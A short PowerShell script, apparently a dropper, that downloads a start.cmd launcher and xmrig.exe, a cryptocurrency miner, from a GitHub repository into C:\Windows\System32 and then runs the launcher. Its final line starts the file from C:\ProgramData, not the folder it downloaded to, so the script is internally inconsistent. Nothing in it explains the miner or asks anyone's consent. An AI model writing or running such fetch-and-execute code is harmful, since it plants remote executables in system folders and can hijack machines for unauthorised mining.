[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$url="https://raw.githubusercontent.com/BinhPhuongIT/xmrig-customs/main/start.cmd"
Invoke-WebRequest -Uri $url -OutFile "C:\Windows\System32\start.cmd"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$url="https://raw.githubusercontent.com/BinhPhuongIT/xmrig-customs/main/xmrig.exe"
Invoke-WebRequest -Uri $url -OutFile "C:\Windows\System32\xmrig.exe"

Start-Process -FilePath "C:\ProgramData\start.cmd" -Wait
